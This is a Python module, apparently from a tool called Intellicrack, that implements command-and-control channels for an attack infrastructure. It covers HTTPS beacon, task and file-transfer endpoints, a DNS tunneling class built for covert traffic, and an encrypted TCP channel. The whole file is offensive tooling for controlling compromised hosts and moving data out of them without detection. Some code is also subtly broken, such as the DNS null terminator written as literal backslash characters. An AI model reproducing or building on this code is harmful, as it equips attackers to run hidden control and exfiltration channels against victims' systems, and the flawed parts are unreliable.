"""
Communication Protocols for C2 Infrastructure

Implements multiple communication protocols including HTTPS, DNS, and TCP
with encryption and stealth capabilities.
"""

import asyncio
import base64
import json
import logging
import ssl
import time
from typing import Any, Dict, List, Optional

# Optional import for aiohttp
try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    aiohttp = None
    HAS_AIOHTTP = False

logger = logging.getLogger(__name__)


class BaseProtocol:
    """Base class for all communication protocols."""

    def __init__(self, host: str, port: int, encryption_manager):
        self.host = host
        self.port = port
        self.encryption_manager = encryption_manager
        self.logger = logging.getLogger(f"IntellicrackLogger.{self.__class__.__name__}")
        self.connected = False
        self.connection_count = 0

        # Event handlers
        self.on_connection = None
        self.on_message = None
        self.on_disconnection = None
        self.on_error = None

    async def start(self):
        """Start the protocol handler."""
        raise NotImplementedError

    async def stop(self):
        """Stop the protocol handler."""
        raise NotImplementedError

    async def send_message(self, message: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Send message through the protocol."""
        raise NotImplementedError

    async def connect(self) -> bool:
        """Establish connection (client-side)."""
        raise NotImplementedError

    async def disconnect(self):
        """Disconnect from server (client-side)."""
        raise NotImplementedError


class HttpsProtocol(BaseProtocol):
    """
    HTTPS communication protocol with SSL/TLS encryption.
    Supports both server and client modes.
    """

    def __init__(self, host: str, port: int, ssl_cert: str = None,
                 ssl_key: str = None, ssl_verify: bool = True, encryption_manager=None):
        super().__init__(host, port, encryption_manager)
        self.ssl_cert = ssl_cert
        self.ssl_key = ssl_key
        self.ssl_verify = ssl_verify
        self.server = None
        self.session = None
        self.endpoints = {
            '/beacon': self._handle_beacon,
            '/task': self._handle_task,
            '/upload': self._handle_upload,
            '/download': self._handle_download
        }

    def _create_response(self, body=None, status=200):
        """Create HTTP response, handling missing aiohttp gracefully."""
        if not HAS_AIOHTTP:
            # Return a mock response for testing
            return {'body': body, 'status': status}
        # Use the globally imported aiohttp
        return aiohttp.web.Response(body=body, status=status)

    async def start(self):
        """Start HTTPS server."""
        if not HAS_AIOHTTP:
            raise ImportError("aiohttp is required for HTTPS protocol support")

        try:
            # Use the globally imported aiohttp
            app = aiohttp.web.Application()

            # Register endpoints
            for path, handler in self.endpoints.items():
                app.router.add_post(path, handler)

            # SSL context
            ssl_context = None
            if self.ssl_cert and self.ssl_key:
                ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                ssl_context.load_cert_chain(self.ssl_cert, self.ssl_key)

            # Start server
            self.server = await asyncio.start_server(
                self._handle_client_connection,
                self.host,
                self.port,
                ssl=ssl_context
            )

            self.connected = True
            self.logger.info(f"HTTPS server started on {self.host}:{self.port}")

        except Exception as e:
            self.logger.error(f"Failed to start HTTPS server: {e}")
            raise

    async def stop(self):
        """Stop HTTPS server."""
        try:
            if self.server:
                self.server.close()
                await self.server.wait_closed()

            if self.session:
                await self.session.close()

            self.connected = False
            self.logger.info("HTTPS server stopped")

        except Exception as e:
            self.logger.error(f"Error stopping HTTPS server: {e}")

    async def connect(self) -> bool:
        """Connect to HTTPS server (client mode)."""
        if not HAS_AIOHTTP:
            self.logger.error("aiohttp is required for HTTPS protocol support")
            return False

        try:
            # Use the globally imported aiohttp
            connector = aiohttp.TCPConnector(ssl=self.ssl_verify)
            self.session = aiohttp.ClientSession(connector=connector)

            # Test connection
            base_url = f"{'https' if self.ssl_cert else 'http'}://{self.host}:{self.port}"
            async with self.session.get(f"{base_url}/ping") as response:
                if response.status == 200:
                    self.connected = True
                    return True

        except Exception as e:
            self.logger.error(f"HTTPS connection failed: {e}")

        return False

    async def disconnect(self):
        """Disconnect from HTTPS server (client mode)."""
        if self.session:
            await self.session.close()
            self.session = None
        self.connected = False

    async def send_message(self, message: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Send message via HTTPS POST."""
        try:
            if not self.session:
                return None

            # Encrypt message
            encrypted_data = self.encryption_manager.encrypt(json.dumps(message))

            # Determine endpoint based on message type
            endpoint = self._get_endpoint_for_message(message)
            base_url = f"{'https' if self.ssl_cert else 'http'}://{self.host}:{self.port}"

            async with self.session.post(
                f"{base_url}{endpoint}",
                data=encrypted_data,
                headers={'Content-Type': 'application/octet-stream'}
            ) as response:
                if response.status == 200:
                    response_data = await response.read()
                    decrypted = self.encryption_manager.decrypt(response_data)
                    return json.loads(decrypted)

        except Exception as e:
            self.logger.error(f"HTTPS message send failed: {e}")

        return None

    def _get_endpoint_for_message(self, message: Dict[str, Any]) -> str:
        """Get appropriate endpoint based on message type."""
        msg_type = message.get('type', 'beacon')

        if msg_type in ['beacon', 'registration']:
            return '/beacon'
        elif msg_type in ['task_result', 'command']:
            return '/task'
        elif msg_type == 'file_upload':
            return '/upload'
        elif msg_type == 'file_download':
            return '/download'
        else:
            return '/beacon'

    async def _handle_client_connection(self, reader, writer):
        """Handle incoming client connection."""
        try:
            client_addr = writer.get_extra_info('peername')
            self.connection_count += 1
            self.logger.debug(f"Reader stream ready: {reader is not None}")

            if self.on_connection and callable(self.on_connection):
                await self.on_connection({
                    'remote_addr': client_addr,
                    'protocol': 'https',
                    'timestamp': time.time()
                })

        except Exception as e:
            self.logger.error(f"Error handling client connection: {e}")

    async def _handle_beacon(self, request):
        """Handle beacon endpoint."""
        try:
            encrypted_data = await request.read()
            decrypted = self.encryption_manager.decrypt(encrypted_data)
            message = json.loads(decrypted)

            if self.on_message and callable(self.on_message):
                session_id = message.get('session_id', 'unknown')
                await self.on_message(session_id, message)

            # Send response
            response = {'status': 'success', 'timestamp': time.time()}
            encrypted_response = self.encryption_manager.encrypt(json.dumps(response))

            return self._create_response(body=encrypted_response)

        except Exception as e:
            self.logger.error(f"Error handling beacon: {e}")
            return self._create_response(status=500)

    async def _handle_task(self, request):
        """Handle task endpoint."""
        try:
            encrypted_data = await request.read()
            decrypted = self.encryption_manager.decrypt(encrypted_data)
            message = json.loads(decrypted)

            if self.on_message and callable(self.on_message):
                session_id = message.get('session_id', 'unknown')
                await self.on_message(session_id, message)

            response = {'status': 'success', 'timestamp': time.time()}
            encrypted_response = self.encryption_manager.encrypt(json.dumps(response))

            return self._create_response(body=encrypted_response)

        except Exception as e:
            self.logger.error(f"Error handling task: {e}")
            return self._create_response(status=500)

    async def _handle_upload(self, request):
        """Handle file upload endpoint."""
        try:
            encrypted_data = await request.read()
            decrypted = self.encryption_manager.decrypt(encrypted_data)
            message = json.loads(decrypted)

            if self.on_message and callable(self.on_message):
                session_id = message.get('session_id', 'unknown')
                await self.on_message(session_id, message)

            response = {'status': 'success', 'timestamp': time.time()}
            encrypted_response = self.encryption_manager.encrypt(json.dumps(response))

            return self._create_response(body=encrypted_response)

        except Exception as e:
            self.logger.error(f"Error handling upload: {e}")
            return self._create_response(status=500)

    async def _handle_download(self, request):
        """Handle file download endpoint."""
        try:
            encrypted_data = await request.read()
            decrypted = self.encryption_manager.decrypt(encrypted_data)
            message = json.loads(decrypted)

            if self.on_message and callable(self.on_message):
                session_id = message.get('session_id', 'unknown')
                await self.on_message(session_id, message)

            response = {'status': 'success', 'timestamp': time.time()}
            encrypted_response = self.encryption_manager.encrypt(json.dumps(response))

            return self._create_response(body=encrypted_response)

        except Exception as e:
            self.logger.error(f"Error handling download: {e}")
            return self._create_response(status=500)


class DnsProtocol(BaseProtocol):
    """
    DNS tunneling protocol for covert communication.
    Uses DNS queries and responses to tunnel C2 traffic.
    """

    def __init__(self, host: str, port: int, domain: str, encryption_manager=None):
        super().__init__(host, port, encryption_manager)
        self.domain = domain
        self.server = None
        self.query_cache = {}

    async def start(self):
        """Start DNS server."""
        try:
            # Create DNS server socket
            import socket

            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.bind((self.host, self.port))
            self.socket.setblocking(False)

            self.connected = True
            self.logger.info(f"DNS server started on {self.host}:{self.port}")

            # Start DNS handler loop
            asyncio.create_task(self._dns_handler_loop())

        except Exception as e:
            self.logger.error(f"Failed to start DNS server: {e}")
            raise

    async def stop(self):
        """Stop DNS server."""
        try:
            if hasattr(self, 'socket'):
                self.socket.close()

            self.connected = False
            self.logger.info("DNS server stopped")

        except Exception as e:
            self.logger.error(f"Error stopping DNS server: {e}")

    async def connect(self) -> bool:
        """Connect to DNS server (client mode)."""
        try:
            import socket

            # Test DNS connectivity
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.settimeout(5)

            # Send test query
            test_query = self._build_dns_query("test.example.com")
            self.socket.sendto(test_query, (self.host, self.port))

            response, addr = self.socket.recvfrom(1024)
            if response:
                self.connected = True
                return True

        except Exception as e:
            self.logger.error(f"DNS connection failed: {e}")

        return False

    async def disconnect(self):
        """Disconnect from DNS server (client mode)."""
        if hasattr(self, 'socket'):
            self.socket.close()
        self.connected = False

    async def send_message(self, message: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Send message via DNS queries."""
        try:
            # Encrypt and encode message
            encrypted_data = self.encryption_manager.encrypt(json.dumps(message))
            encoded_data = base64.b64encode(encrypted_data).decode('utf-8')

            # Split into DNS query chunks
            chunks = self._split_into_dns_chunks(encoded_data)

            responses = []
            for i, chunk in enumerate(chunks):
                query_domain = f"{chunk}.{i}.{self.domain}"
                dns_query = self._build_dns_query(query_domain)

                self.socket.sendto(dns_query, (self.host, self.port))
                response, addr = self.socket.recvfrom(1024)

                if response:
                    parsed_response = self._parse_dns_response(response)
                    responses.append(parsed_response)

            # Combine responses
            if responses:
                combined_response = self._combine_dns_responses(responses)
                if combined_response:
                    decrypted = self.encryption_manager.decrypt(base64.b64decode(combined_response))
                    return json.loads(decrypted)

        except Exception as e:
            self.logger.error(f"DNS message send failed: {e}")

        return None

    def _split_into_dns_chunks(self, data: str, max_chunk_size: int = 60) -> List[str]:
        """Split data into DNS-safe chunks."""
        chunks = []
        for i in range(0, len(data), max_chunk_size):
            chunk = data[i:i+max_chunk_size]
            # Make DNS-safe by replacing problematic characters
            chunk = chunk.replace('+', '-').replace('/', '_').replace('=', '')
            chunks.append(chunk)
        return chunks

    def _build_dns_query(self, domain: str) -> bytes:
        """Build DNS query packet."""
        # Simplified DNS query builder
        import random
        import struct

        transaction_id = random.randint(1, 65535)
        flags = 0x0100  # Standard query
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0

        header = struct.pack('!HHHHHH', transaction_id, flags, questions,
                           answer_rrs, authority_rrs, additional_rrs)

        # Encode domain name
        qname = b''
        for part in domain.split('.'):
            qname += bytes([len(part)]) + part.encode('utf-8')
        qname += b'\\x00'  # Null terminator

        qtype = struct.pack('!H', 1)  # A record
        qclass = struct.pack('!H', 1)  # IN class

        return header + qname + qtype + qclass

    def _parse_dns_response(self, response: bytes) -> str:
        """Parse DNS response and extract data."""
        import struct

        try:
            self.logger.debug(f"Parsing DNS response of {len(response)} bytes")

            if len(response) < 12:
                self.logger.warning("DNS response too short")
                return ""

            # Parse DNS header
            header = struct.unpack('!HHHHHH', response[:12])
            transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs = header

            self.logger.debug(f"DNS Response - ID: {transaction_id}, Answers: {answer_rrs}")

            if answer_rrs == 0:
                self.logger.debug("No answers in DNS response")
                return ""

            # Skip question section
            offset = 12

            # Parse question section to skip it
            for _ in range(questions):
                # Skip QNAME
                while offset < len(response) and response[offset] != 0:
                    length = response[offset]
                    if length == 0:
                        break
                    if length > 63:  # Pointer
                        offset += 2
                        break
                    offset += length + 1

                if offset < len(response) and response[offset] == 0:
                    offset += 1  # Skip null terminator

                offset += 4  # Skip QTYPE and QCLASS

            # Parse answer section
            extracted_data = []

            for _ in range(answer_rrs):
                if offset >= len(response):
                    break

                # Skip NAME (could be pointer or full name)
                if offset < len(response) and response[offset] & 0xC0 == 0xC0:
                    offset += 2  # Pointer
                else:
                    # Full name
                    while offset < len(response) and response[offset] != 0:
                        length = response[offset]
                        if length == 0:
                            break
                        if length & 0xC0 == 0xC0:  # Pointer
                            offset += 2
                            break
                        offset += length + 1

                    if offset < len(response) and response[offset] == 0:
                        offset += 1

                if offset + 10 > len(response):
                    break

                # Parse TYPE, CLASS, TTL, RDLENGTH
                rr_type, rr_class, ttl, rdlength = struct.unpack('!HHIH', response[offset:offset+10])
                offset += 10

                if offset + rdlength > len(response):
                    break

                # Extract RDATA based on type
                rdata = response[offset:offset+rdlength]

                if rr_type == 1:  # A record
                    if rdlength == 4:
                        ip = '.'.join(str(b) for b in rdata)
                        self.logger.debug(f"A record: {ip}")

                        # Try to extract encoded data from IP octets
                        try:
                            # Convert IP octets to base64-encoded string
                            data_chunk = ''.join(chr(b) for b in rdata if 32 <= b <= 126)
                            if data_chunk:
                                extracted_data.append(data_chunk)
                        except:
                            pass

                elif rr_type == 16:  # TXT record
                    # TXT records store our data directly
                    txt_data = ""
                    txt_offset = 0
                    while txt_offset < len(rdata):
                        if txt_offset >= len(rdata):
                            break
                        length = rdata[txt_offset]
                        txt_offset += 1
                        if txt_offset + length <= len(rdata):
                            txt_chunk = rdata[txt_offset:txt_offset + length].decode('utf-8', errors='ignore')
                            txt_data += txt_chunk
                            txt_offset += length
                        else:
                            break

                    if txt_data:
                        self.logger.debug(f"TXT record data: {txt_data[:50]}...")
                        extracted_data.append(txt_data)

                elif rr_type == 5:  # CNAME record
                    # Parse CNAME and extract data from subdomain
                    cname = self._parse_domain_name(rdata, response)
                    if cname:
                        self.logger.debug(f"CNAME: {cname}")
                        # Extract data from subdomain part
                        parts = cname.split('.')
                        if len(parts) > 0:
                            data_part = parts[0]
                            # Decode base64-safe characters
                            data_part = data_part.replace('-', '+').replace('_', '/')
                            try:
                                # Pad base64 if needed
                                missing_padding = len(data_part) % 4
                                if missing_padding:
                                    data_part += '=' * (4 - missing_padding)

                                decoded = base64.b64decode(data_part).decode('utf-8', errors='ignore')
                                if decoded:
                                    extracted_data.append(decoded)
                            except:
                                extracted_data.append(data_part)

                offset += rdlength

            # Combine all extracted data
            result = ''.join(extracted_data)
            self.logger.debug(f"Extracted {len(result)} bytes of data from DNS response")

            return result

        except Exception as e:
            self.logger.error(f"Error parsing DNS response: {e}")
            return ""

    def _parse_domain_name(self, data: bytes, packet: bytes, offset: int = 0) -> str:
        """Parse domain name from DNS data, handling compression pointers."""
        labels = []
        original_offset = offset
        jumped = False

        try:
            while offset < len(data):
                length = data[offset]

                if length == 0:
                    break

                if length & 0xC0 == 0xC0:  # Compression pointer
                    if not jumped:
                        original_offset = offset + 2
                        jumped = True

                    # Extract pointer offset
                    pointer = ((length & 0x3F) << 8) | data[offset + 1]
                    if pointer < len(packet):
                        offset = pointer
                        data = packet
                    else:
                        break
                else:
                    offset += 1
                    if offset + length <= len(data):
                        label = data[offset:offset + length].decode('utf-8', errors='ignore')
                        labels.append(label)
                        offset += length
                    else:
                        break

            return '.'.join(labels)

        except Exception as e:
            self.logger.error(f"Error parsing domain name: {e}")
            return ""

    def _combine_dns_responses(self, responses: List[str]) -> str:
        """Combine multiple DNS responses into original data."""
        return ''.join(responses)

    async def _dns_handler_loop(self):
        """Main DNS packet handling loop."""
        while self.connected:
            try:
                # Check for incoming DNS queries
                data, addr = await asyncio.wait_for(
                    asyncio.get_event_loop().sock_recvfrom(self.socket, 1024),
                    timeout=1.0
                )

                # Process DNS query
                response = await self._process_dns_query(data, addr)
                if response:
                    await asyncio.get_event_loop().sock_sendto(self.socket, response, addr)

            except asyncio.TimeoutError:
                continue
            except Exception as e:
                self.logger.error(f"Error in DNS handler loop: {e}")

    async def _process_dns_query(self, data: bytes, addr: tuple) -> bytes:
        """Process incoming DNS query and extract C2 data."""
        try:
            self.logger.debug(f"Processing DNS query from {addr}")
            # Parse DNS query and extract domain
            domain = self._extract_domain_from_query(data)

            if domain and self.domain in domain:
                # Extract C2 data from subdomain
                c2_data = self._extract_c2_data_from_domain(domain)

                if c2_data and self.on_message and callable(self.on_message):
                    # Decrypt and process message
                    try:
                        decrypted = self.encryption_manager.decrypt(base64.b64decode(c2_data))
                        message = json.loads(decrypted)
                        session_id = message.get('session_id', 'unknown')
                        await self.on_message(session_id, message)
                    except Exception as e:
                        self.logger.warning(f"Failed to decrypt DNS message: {e}")

                # Build response
                return self._build_dns_response(data)

        except Exception as e:
            self.logger.error(f"Error processing DNS query: {e}")

        return None

    def _extract_domain_from_query(self, data: bytes) -> str:
        """Extract domain name from DNS query."""
        try:
            # Skip DNS header (12 bytes)
            offset = 12
            domain_parts = []

            while offset < len(data):
                length = data[offset]
                if length == 0:
                    break

                offset += 1
                if offset + length > len(data):
                    break

                part = data[offset:offset + length].decode('utf-8')
                domain_parts.append(part)
                offset += length

            return '.'.join(domain_parts)

        except Exception as e:
            self.logger.error(f"Error extracting domain: {e}")
            return ""

    def _extract_c2_data_from_domain(self, domain: str) -> str:
        """Extract C2 data from domain name."""
        try:
            # Extract subdomain part before our domain
            if self.domain in domain:
                subdomain = domain.replace(f'.{self.domain}', '')
                # Remove chunk identifier if present
                parts = subdomain.split('.')
                if len(parts) >= 2:
                    return parts[0]  # First part contains the data

        except Exception as e:
            self.logger.error(f"Error extracting C2 data: {e}")

        return ""

    def _build_dns_response(self, query: bytes) -> bytes:
        """Build DNS response packet."""
        try:
            # Simple DNS response builder
            import struct

            # Copy transaction ID from query
            transaction_id = struct.unpack('!H', query[:2])[0]

            # Response flags
            flags = 0x8180  # Standard query response, no error

            # Copy question count
            questions = struct.unpack('!H', query[4:6])[0]

            # Set answer count
            answer_rrs = 1
            authority_rrs = 0
            additional_rrs = 0

            header = struct.pack('!HHHHHH', transaction_id, flags, questions,
                               answer_rrs, authority_rrs, additional_rrs)

            # Copy question section from query (simplified)
            question_start = 12
            question_end = question_start

            # Find end of question section
            while question_end < len(query):
                if query[question_end] == 0:
                    question_end += 5  # Null + QTYPE + QCLASS
                    break
                question_end += 1

            question_section = query[question_start:question_end]

            # Build answer section
            name_pointer = struct.pack('!H', 0xC00C)  # Pointer to question name
            answer_type = struct.pack('!H', 1)  # A record
            answer_class = struct.pack('!H', 1)  # IN class
            ttl = struct.pack('!I', 300)  # 5 minutes TTL
            rdlength = struct.pack('!H', 4)  # IPv4 address length
            rdata = struct.pack('!I', 0x7F000001)  # 127.0.0.1

            answer_section = name_pointer + answer_type + answer_class + ttl + rdlength + rdata

            return header + question_section + answer_section

        except Exception as e:
            self.logger.error(f"Error building DNS response: {e}")
            return b''


class TcpProtocol(BaseProtocol):
    """
    Raw TCP communication protocol with custom framing.
    Provides reliable communication with connection persistence.
    """

    def __init__(self, host: str, port: int, encryption_manager=None):
        super().__init__(host, port, encryption_manager)
        self.server = None
        self.client_connections = {}
        self.reader = None
        self.writer = None

    async def start(self):
        """Start TCP server."""
        try:
            self.server = await asyncio.start_server(
                self._handle_client_connection,
                self.host,
                self.port
            )

            self.connected = True
            self.logger.info(f"TCP server started on {self.host}:{self.port}")

        except Exception as e:
            self.logger.error(f"Failed to start TCP server: {e}")
            raise

    async def stop(self):
        """Stop TCP server."""
        try:
            if self.server:
                self.server.close()
                await self.server.wait_closed()

            # Close all client connections
            for writer in self.client_connections.values():
                writer.close()
                await writer.wait_closed()

            if self.writer:
                self.writer.close()
                await self.writer.wait_closed()

            self.connected = False
            self.logger.info("TCP server stopped")

        except Exception as e:
            self.logger.error(f"Error stopping TCP server: {e}")

    async def connect(self) -> bool:
        """Connect to TCP server (client mode)."""
        try:
            self.reader, self.writer = await asyncio.open_connection(
                self.host, self.port
            )

            self.connected = True
            return True

        except Exception as e:
            self.logger.error(f"TCP connection failed: {e}")
            return False

    async def disconnect(self):
        """Disconnect from TCP server (client mode)."""
        if self.writer:
            self.writer.close()
            await self.writer.wait_closed()
            self.writer = None
            self.reader = None
        self.connected = False

    async def send_message(self, message: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Send message via TCP connection."""
        try:
            if not self.writer:
                return None

            # Encrypt message
            encrypted_data = self.encryption_manager.encrypt(json.dumps(message))

            # Frame message (length prefix)
            message_length = len(encrypted_data)
            frame = message_length.to_bytes(4, byteorder='big') + encrypted_data

            # Send message
            self.writer.write(frame)
            await self.writer.drain()

            # Read response
            response_length_bytes = await self.reader.readexactly(4)
            response_length = int.from_bytes(response_length_bytes, byteorder='big')

            if response_length > 0:
                encrypted_response = await self.reader.readexactly(response_length)
                decrypted = self.encryption_manager.decrypt(encrypted_response)
                return json.loads(decrypted)

        except Exception as e:
            self.logger.error(f"TCP message send failed: {e}")

        return None

    async def _handle_client_connection(self, reader, writer):
        """Handle incoming TCP client connection."""
        try:
            client_addr = writer.get_extra_info('peername')
            session_id = f"tcp_{client_addr[0]}_{client_addr[1]}_{int(time.time())}"

            self.client_connections[session_id] = writer
            self.connection_count += 1

            if self.on_connection and callable(self.on_connection):
                await self.on_connection({
                    'session_id': session_id,
                    'remote_addr': client_addr,
                    'protocol': 'tcp',
                    'timestamp': time.time()
                })

            # Handle messages from this client
            await self._handle_client_messages(reader, writer, session_id)

        except Exception as e:
            self.logger.error(f"Error handling TCP client connection: {e}")
        finally:
            if session_id in self.client_connections:
                del self.client_connections[session_id]

    async def _handle_client_messages(self, reader, writer, session_id: str):
        """Handle messages from a specific client."""
        try:
            while True:
                # Read message length
                length_bytes = await reader.readexactly(4)
                message_length = int.from_bytes(length_bytes, byteorder='big')

                if message_length == 0:
                    break

                # Read message data
                encrypted_data = await reader.readexactly(message_length)

                # Decrypt and parse message
                decrypted = self.encryption_manager.decrypt(encrypted_data)
                message = json.loads(decrypted)

                if self.on_message and callable(self.on_message):
                    await self.on_message(session_id, message)

                # Send acknowledgment
                ack = {'status': 'success', 'timestamp': time.time()}
                encrypted_ack = self.encryption_manager.encrypt(json.dumps(ack))

                ack_length = len(encrypted_ack)
                frame = ack_length.to_bytes(4, byteorder='big') + encrypted_ack

                writer.write(frame)
                await writer.drain()

        except asyncio.IncompleteReadError:
            # Client disconnected
            if self.on_disconnection and callable(self.on_disconnection):
                await self.on_disconnection(session_id)
        except Exception as e:
            self.logger.error(f"Error handling client messages: {e}")
            if self.on_error and callable(self.on_error):
                await self.on_error('tcp', e)
